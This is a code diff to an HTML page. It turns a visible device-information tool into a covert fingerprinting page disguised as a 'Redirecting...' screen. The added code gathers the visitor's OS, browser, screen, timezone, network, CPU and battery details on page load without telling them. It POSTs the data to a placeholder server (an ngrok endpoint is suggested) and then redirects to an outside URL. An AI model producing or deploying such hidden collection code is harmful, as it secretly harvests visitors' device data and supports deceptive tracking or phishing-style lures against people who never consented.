@@ -3,58 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Information</title>
+    <title>Loading...</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            padding: 20px;
-            max-width: 90%;
-            margin: 0 auto;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
             background-color: #f5f5f5;
-            line-height: 1.6;
         }
-        h1 {
-            font-size: 1.5em;
-            color: #222;
-            text-align: center;
-        }
-        #info {
-            background: white;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            white-space: pre-wrap;
-            font-size: 0.9em;
-            margin-bottom: 20px;
-        }
-        button {
-            display: inline-block;
-            padding: 12px 24px;
-            margin: 5px;
-            background-color: #007BFF;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1em;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        @media (max-width: 600px) {
-            button {
-                width: 100%;
-                margin: 10px 0;
-            }
+        p {
+            font-size: 1.2em;
+            color: #333;
         }
     </style>
 </head>
 <body>
-    <h1>Device Information</h1>
-    <div id="info">Loading device information...</div>
-    <button onclick="copyInfo()">Copy to Clipboard</button>
-    <button onclick="emailInfo()">Email Results</button>
-
+    <p>Redirecting...</p>
     <script>
         function getDeviceInfo() {
             // Collect device and browser information
@@ -68,27 +35,28 @@
                 "Device Pixel Ratio": window.devicePixelRatio || "Unknown",
                 "Language": navigator.language || "Unknown",
                 "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
-                "Battery": "Checking battery status...",
-                "CPU Cores": navigator.hardwareConcurrency || "Unknown"
+                "CPU Cores": navigator.hardwareConcurrency || "Unknown",
+                "Network Type": navigator.connection ? navigator.connection.type || "Unknown" : "Network API not supported",
+                "Effective Connection Type": navigator.connection ? navigator.connection.effectiveType || "Unknown" : "Unknown",
+                "Timestamp": new Date().toLocaleString()
             };
 
             // Attempt to get battery info (if supported)
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     info.Battery = `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging ? 'Yes' : 'No'})`;
-                    displayInfo(info);
+                    sendToServer(info);
                 }).catch(err => {
                     info.Battery = "Battery info unavailable: " + err.message;
-                    displayInfo(info);
+                    sendToServer(info);
                 });
             } else {
                 info.Battery = "Battery API not supported";
-                displayInfo(info);
+                sendToServer(info);
             }
         }
 
         function getOS(userAgent) {
-            // Parse OS from userAgent
             if (/android/i.test(userAgent)) return "Android";
             if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
             if (/Win/i.test(userAgent)) return "Windows";
@@ -98,7 +66,6 @@
         }
 
         function getBrowser(userAgent) {
-            // Parse browser from userAgent
             if (/chrome|crios/i.test(userAgent)) return "Chrome";
             if (/firefox|fxios/i.test(userAgent)) return "Firefox";
             if (/safari/i.test(userAgent) && !/chrome|crios/i.test(userAgent)) return "Safari";
@@ -106,31 +73,25 @@
             return "Unknown";
         }
 
-        function displayInfo(info) {
-            // Format and display info
-            let output = "Device Information (Generated at " + new Date().toLocaleString() + "):\n\n";
-            for (const [key, value] of Object.entries(info)) {
-                output += `${key}: ${value}\n`;
-            }
-            document.getElementById("info").textContent = output;
-        }
-
-        function copyInfo() {
-            // Copy info to clipboard
-            const text = document.getElementById("info").textContent;
-            navigator.clipboard.writeText(text).then(() => {
-                alert("Device info copied to clipboard!");
-            }).catch(err => {
-                alert("Failed to copy: " + err.message);
-            });
-        }
-
-        function emailInfo() {
-            // Create mailto link to send info
-            const text = document.getElementById("info").textContent;
-            const subject = "Device Information";
-            const mailto = `mailto:?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(text)}`;
-            window.location.href = mailto;
+        function sendToServer(info) {
+            // Replace with your ngrok or server URL
+            const serverUrl = "http://your-server-url:8000/submit";
+            fetch(serverUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(info)
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Data sent:", data);
+                    // Redirect to the specified URL
+                    window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
+                })
+                .catch(err => {
+                    console.error("Failed to send:", err);
+                    // Redirect even if sending fails
+                    window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
+                });
         }
 
         // Run on page load
